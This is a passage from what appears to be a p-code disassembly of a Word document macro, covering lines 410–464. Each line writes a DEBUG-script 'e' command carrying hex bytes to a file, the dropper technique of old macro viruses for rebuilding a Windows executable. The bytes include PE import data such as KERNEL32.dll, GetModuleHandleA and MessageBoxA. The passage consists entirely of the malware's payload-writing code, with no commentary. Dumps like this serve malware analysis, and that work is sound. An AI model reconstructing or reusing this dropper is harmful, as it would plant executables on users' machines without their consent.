' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #411:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #412:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #413:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #414:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #415:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1a90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #416:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1aa0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #417:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ab0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #418:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ac0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #419:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ad0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #420:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ae0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #421:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1af0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #422:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b00 3c 40 00 00 00 00 00 00 00 00 00 00 64 40 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #423:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b10 50 40 00 00 48 40 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #424:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b20 71 40 00 00 5c 40 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #425:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b30 00 00 00 00 00 00 00 00 00 00 00 00 7c 40 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #426:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b40 90 40 00 00 00 00 00 00 9e 40 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #427:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b50 7c 40 00 00 90 40 00 00 00 00 00 00 9e 40 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #428:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b60 00 00 00 00 4b 45 52 4e 45 4c 33 32 2e 64 6c 6c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #429:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b70 00 55 53 45 52 33 32 2e 64 6c 6c 00 00 00 47 65 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #430:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b80 74 4d 6f 64 75 6c 65 48 61 6e 64 6c 65 41 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #431:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1b90 00 00 45 78 69 74 50 72 6f 63 65 73 73 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #432:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ba0 4d 65 73 73 61 67 65 42 6f 78 41 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #433:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1bb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #434:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1bc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #435:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1bd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #436:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1be0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #437:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1bf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #438:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #439:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #440:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #441:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #442:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #443:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #444:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #445:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #446:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #447:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1c90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #448:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ca0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #449:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1cb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #450:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1cc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #451:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1cd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #452:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1ce0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #453:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1cf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #454:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d00 00 10 00 00 64 01 00 00 1b 30 20 30 28 30 3a 30 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #455:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d10 40 30 4c 30 51 30 78 30 96 30 9c 30 a5 30 bc 30 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #456:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d20 cd 30 d6 30 dc 30 e5 30 eb 30 f4 30 fa 30 05 31 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #457:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d30 0f 31 25 31 33 31 3b 31 48 31 61 31 78 31 85 31 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #458:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d40 9d 31 a3 31 b0 31 c7 31 e4 31 f5 31 04 32 25 32 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #459:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d50 39 32 47 32 4d 32 53 32 6d 32 73 32 8d 32 c2 32 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #460:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d60 ce 32 0b 30 38 33 52 33 e1 32 ea 32 f0 32 f6 32 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #461:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d70 ff 32 1e 33 24 33 2f 33 3e 33 48 33 6a 33 79 33 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #462:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d80 88 33 a6 33 ac 33 be 33 c4 33 ca 33 d4 33 df 33 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #463:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1d90 ea 33 f0 33 00 34 0b 34 17 34 37 34 43 34 58 34 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #464:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
